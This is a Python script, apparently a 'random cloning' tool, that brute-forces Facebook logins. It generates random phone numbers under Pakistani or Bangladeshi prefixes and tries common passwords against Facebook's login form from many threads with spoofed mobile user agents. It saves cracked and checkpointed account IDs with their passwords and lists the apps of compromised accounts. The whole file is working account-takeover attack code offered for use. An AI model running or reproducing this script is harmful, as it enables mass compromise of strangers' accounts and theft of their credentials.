#SOURCE GENRETED RONYS DECODE FILE
import os
try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')  
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
import os,time,subprocess,requests
P = '\033[1;37m'
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid

try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	
from bs4 import BeautifulSoup
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
user=[]

for agent in range(10000):
	zz='Mozilla/5.0 (Linux; U; Android'
	x=random.choice(['6','7','8','9','10','11','12'])
	v=' en-us; GT-'
	n=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	m=random.randrange(1, 999)
	l=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	k='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	o=random.randrange(73,100)
	p='0'
	r=random.randrange(4200,4900)
	y=random.randrange(40,150)
	u='Mobile Safari/537.36'
for agent in range(10000):
    aa='BET_61D_WIFI_11C_HW'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='C67_SmartOpus_SL008_20191225_V802'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='Release/2019.12.25 WAP Browser/'
    h=random.randrange(73,100)
    i='MAUI'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='.Profile/ Q03C1-2.40 en-US'
    fullagnt=f'{zz} {x}; {v}{n}{m}{l}) {k}{o}.{p}.{r}.{y} {u}{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    user.append(fullagnt)
def clear():
	os.system('clear')
	print(logo)
logo =""" 
\033[97;1m   ##     ##    ###    ##    ## #### 
\033[96;1m   ###   ###   ## ##   ###   ##  ##  
\033[93;1m   #### ####  ##   ##  ####  ##  ##  
\033[94;1m   ## ### ## ##     ## ## ## ##  ##  
\033[97;1m   ##     ## ######### ##  ####  ## 
\033[91;1m   ##     ## ##     ## ##   ###  ##  
\033[92;1m   ##     ## ##     ## ##    ## #### 
                                                               
\033[1;37m══════════════════════════════════════════
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;33mUSMAN\33[0;m\033[1;32m EX \033[1;33mRONY \33[0;m
\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m Usman Rajpoot
\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mUSMAN-RAJPOOT
\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m0.3
\033[1;37m══════════════════════════════════════════\n"""
os.system ('clear')
time.sleep(0)
print("\033[1;32m[•] \033[1;33mFOLLOW MY FACEBOOK ID....!")
#os.system("xdg-open https://www.facebook.com/usman.rajpoot.1100")

def linex():
	print("%s(!)══════════════════════════════════════════%s"%(P,P))
loop = 0
cps = []
oks = []
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="get")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		
		print('\033[1;37m(•)══════════════════════════════════════════')
		print(f'\r%s[%s×%s] %sActive Applications Not Found %s        '%(N,H,N,H,N))
		print('\033[1;37m(•)══════════════════════════════════════════')
	else:
		print('\033[1;37m(•)══════════════════════════════════════════')
		print(f'\r{A}[√] %sActive Applications '%(H))
		for i in range(len(game)):
			print(f"\r%s[%s] %s %s"%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s[%s×%s] %sExpired Applications Not Found %s        '%(N,M,N,M,N))
		print('\033[1;37m(•)══════════════════════════════════════════')
	else:
		print('\033[1;37m(•)══════════════════════════════════════════')
		print(f'\r{A}[√] %sExpired Applications '%(M))
		for i in range(len(game)):
			print(f"\r%s[%s] %s %s"%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
			print('\033[1;37m(•)══════════════════════════════════════════')
mtd = []
def Main():

	clear()
	print('\t\033[1;37m\033[1;41mENJOY TOOL \033[1;0m\33[1;37m')
	linex()
	print('[1] Random Cloning\033[1;32m >>> \033[1;33m{Supper}\n\033[1;37m[2] Contact On FaceBook \n[3] Contact On Whatsapp \n[0] \033[1;31mExit Programming')
	mani = input('\033[1;37m[•] Choose : ')
	if mani =='1':
		#os.system('xdg-open https://www.facebook.com/usman.rajpoot.1100')
		Random()
	if mani =='2':
		os.system('xdg-open https://www.facebook.com/usman.rajpoot.1100');Main()
	if mani =='3':
		os.system('xdg-open wa.me/+923187061605');Main()
	if mani =='0':
		os.system('xdg-open https://www.facebook.com/usman.rajpoot.1100')
		exit('[•] Thanks For Use\n[•] See You Again ')
	else:
		print('[×] Selete Correct Option');Main()

def Random():
	user=[]	
	clear()
	kode = input(f'[~] PAK CODE: 0300,0306,0309,0315,0345 ...\n[~] B D CODE: 880141,880170,880182,880190...\n\033[1;37m[<•>]══════════════════════════════════════════\n[?] PUT CODE: ')
	clear()
	limit = int(input('[!] EXAMPLE : 1000,2000,5000,10000\n[?] LIMINT : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:	
		clear()
		tl = str(len(user))
		print('\033[1;32m(√) Total IDs  :\033[1;32m '+tl)
		print('\033[1;35m(√) Chose Code : \033[1;32m%s'%(kode))
		print("\x1b[38;5;208m(!) Use Flight Mode For Speed UP")
		print('\033[1;37m(<•>)══════════════════════════════════════════')
		for guru in user:
			uid = kode+guru
			pwx = [guru,uid,'khankhan123','khan123','khan12','khan12345','i oove you','bangladesh','khankhan','khan123456','khan1122']
			yaari.submit(mbasic,uid,pwx,tl)
	print('\n\033[1;37m(<•>)══════════════════════════════════════════')
	print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)))
	print('\033[1;37m(<•>)══════════════════════════════════════════')
	print('[•] OK IDS SAVE : /sdcard/MANI-OK.txt\n[•] CP IDS SAVE : /sdcard/MANI-CP.txt')
	input('[•] Press Enter To Back Menu ');Main()
def mbasic(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
			bi = random.choice([A,B,C,D,E,F,G,H])
			session = requests.Session()
			pro = random.choice(user)
			free_fb = session.get(f'https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {
			'authority': 'm.facebook.com',
			'method': 'POST',
			'path': 'https://www.facebook.com/?_rdc=1&_rdr',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'referer': 'https://www.facebook.com/',
			'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agent': pro,}
			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\033[1;32m[USMAN-OK] '+cid+' √ '+ps)
				cek_apk(session,coki)
				open('/sdcard/USMAN-OK.txt', 'a').write(cid+' √ '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid=coki[24:39]
				Red = '\x1b[38;5;208m'
				print(f'\r{Red}[USMAN-CP] '+cid+' • '+ps+'\033[1;97m')
				open('/sdcard/USMAN-CP.txt', 'a').write(cid+' • '+ps+'\n')
				cps.append(cid)
			else:
				continue
		loop+=1
		sys.stdout.write('\r%s[M•A•N•I] %s|OK:-%s'%(bi,loop,len(oks))),
		sys.stdout.flush()
	except:
		pass	
Main()
